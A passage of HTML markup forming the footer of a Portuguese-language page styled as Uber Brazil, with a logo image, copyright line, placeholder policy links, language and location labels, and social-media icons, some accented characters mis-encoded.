                  <img src="https://i.ibb.co/0RR0HNC0/13093103960002-1.png" alt="Logo Uber estilizado em preto e branco, com fundo transparente" class="h-8 w-auto" style="max-height:32px;">
                  <span class="text-white text-sm">¬© 2024 Uber Technologies Inc.</span>
                </div>
                <div class="flex flex-col md:flex-row md:space-x-16 space-y-6 md:space-y-0">
                  <div class="flex flex-col space-y-2">
                    <a class="text-white hover:underline text-base" href="#" style="color: #fff !important;">Privacidade</a>
                    <a class="text-white hover:underline text-base" href="#" style="color: #fff !important;">Acessibilidade</a>
                    <a class="text-white hover:underline text-base" href="#" style="color: #fff !important;">Termos</a>
                  </div>
                  <div class="flex flex-col space-y-2">
                    <span class="text-white text-base" style="color: #fff !important;">Idioma</span>
                    <span class="text-white text-base" style="color: #fff !important;">Portugu√™s (Brasil)</span>
                    <span class="text-white text-base" style="color: #fff !important;">Localiza√ß√£o</span>
                    <span class="text-white text-base" style="color: #fff !important;">Brasil</span>
                  </div>
                  <div class="flex flex-row items-center space-x-4 mt-4 md:mt-0">
                    <a class="text-white text-2xl hover:text-gray-300 transition" href="#"><i class="fab fa-facebook-f"></i></a>
                    <a class="text-white text-2xl hover:text-gray-300 transition" href="#"><i class="fab fa-twitter"></i></a>
                    <a class="text-white text-2xl hover:text-gray-300 transition" href="#"><i class="fab fa-instagram"></i></a>
                    <a class="text-white text-2xl hover:text-gray-300 transition" href="#"><i class="fab fa-youtube"></i></a>
                  </div>
                </div>
              </div>
            </div>
          </footer>
         </body>
        </html>